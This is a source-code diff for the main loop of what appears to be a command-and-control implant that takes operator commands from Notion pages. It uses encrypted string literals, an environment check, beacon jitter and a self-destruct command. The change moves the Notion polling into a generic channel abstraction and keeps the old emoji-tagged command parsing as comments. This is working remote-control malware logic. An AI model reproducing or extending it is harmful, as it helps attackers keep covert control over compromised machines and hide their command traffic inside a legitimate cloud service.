@@ -20,17 +20,16 @@ use litcrypt::{lc, use_litcrypt};
 
 mod config;
 pub mod channels;
-use channels::{ChannelType};
+use channels::{Channel, ChannelType};
 use config::{
     ConfigOptions,
     get_config_options, 
     load_config_options
 };
 
-use notion::{get_blocks, complete_command, create_page, send_result};
 
 mod cmd;
-use cmd::{NotionCommand, CommandType};
+use cmd::{AgentCommand, CommandType};
 mod logger;
 use logger::log_out;
 mod env_check;
@@ -47,7 +46,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut config_options: ConfigOptions;
 
     // Check for command line options
-    // -d: debug mode
     // -c: config file
     // -b: ingest base64 decode
     match args().nth(1) {
@@ -74,6 +72,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let logger = logger::Logger::new(config_options.log_level);
 
+    let channel = match config_options.channel_type {
+        ChannelType::Notion(nc) => nc,
+        ChannelType::Unknown => {
+            panic!("Unknown channel type!");
+        }
+    };
+
+    // Initialize Channel.
+    channel.init();
 
     // Start Notion App if configured to do so
     // TODO: Replace with launch_app abstraction
@@ -130,49 +137,62 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     //  c. Send results
     // 4. Watch for shutdown commands
 
-
-    logger.info(log_out!("Hostname: ", &hn));
-    logger.debug(format!("Config options: {:?}", config_options));
-    
+ 
     loop {
-        // Get Blocks
-        let blocks = get_blocks(&client, &page_id).await?;
 
-        let command_blocks: Vec<&serde_json::Value> = blocks
-            .as_array()
-            .unwrap()
-            .into_iter()
-            .filter(|&b| b["type"] == "to_do")
-            .collect();
+        let commands: Vec<AgentCommand>  = channel.receive().await.unwrap();
 
-        let new_command_blocks: Vec<&serde_json::Value> = command_blocks
-            .into_iter()
-            .filter(|&b| b["to_do"]["checked"] == false)
-            .collect();
-
-        for block in new_command_blocks {
-            match block["to_do"]["text"][0]["text"]["content"].as_str() {
-                Some(s) => {
-                    if s.contains("🎯") {
-                        logger.info(log_out!("Got command: ", s));
-                        let mut notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
-                        let output = notion_command.handle(&mut config_options, &logger).await?;
-                        let command_block_id = block["id"].as_str().unwrap();
-                        complete_command(&client, block.to_owned(), &logger).await;
-                        send_result(&client, command_block_id, output, &logger).await;
-                        // Check for any final work based on command type,
-                        // Like shutting down the agent
-                        match notion_command.command_type {
-                            CommandType::Shutdown => {exit(0);},
-                            CommandType::Selfdestruct => {exit(0)},
-                            _ => {}
-                        }
-                    };
-
-                },
-                None => { continue; }
+        for c in commands {
+            let output: String = c.handle(&mut config_options, &logger).await?;
+            channel.complete(c);
+            channel.send(output, &c.rel);
+            match c.command_type {
+                CommandType::Shutdown => {exit(0);},
+                CommandType::Selfdestruct => {exit(0)},
+                _ => {}
             }
-        }
+        };
+
+        // OLD CODE
+        // ========
+        // Get Blocks
+        // let blocks = get_blocks(&client, &page_id).await?;
+
+        // let command_blocks: Vec<&serde_json::Value> = blocks
+        //     .as_array()
+        //     .unwrap()
+        //     .into_iter()
+        //     .filter(|&b| b["type"] == "to_do")
+        //     .collect();
+
+        // let new_command_blocks: Vec<&serde_json::Value> = command_blocks
+        //     .into_iter()
+        //     .filter(|&b| b["to_do"]["checked"] == false)
+        //     .collect();
+
+        // for block in new_command_blocks {
+        //     match block["to_do"]["text"][0]["text"]["content"].as_str() {
+        //         Some(s) => {
+        //             if s.contains("🎯") {
+        //                 logger.info(log_out!("Got command: ", s));
+        //                 let mut notion_command = AgentCommand::from_string(s.replace("🎯",""))?;
+        //                 let output = notion_command.handle(&mut config_options, &logger).await?;
+        //                 let command_block_id = block["id"].as_str().unwrap();
+        //                 complete_command(&client, block.to_owned(), &logger).await;
+        //                 send_result(&client, command_block_id, output, &logger).await;
+        //                 // Check for any final work based on command type,
+        //                 // Like shutting down the agent
+        //                 match notion_command.command_type {
+        //                     CommandType::Shutdown => {exit(0);},
+        //                     CommandType::Selfdestruct => {exit(0)},
+        //                     _ => {}
+        //                 }
+        //             };
+
+        //         },
+        //         None => { continue; }
+        //     }
+        // }
 
         // Handle jitter
         let mut rng = rand::thread_rng();
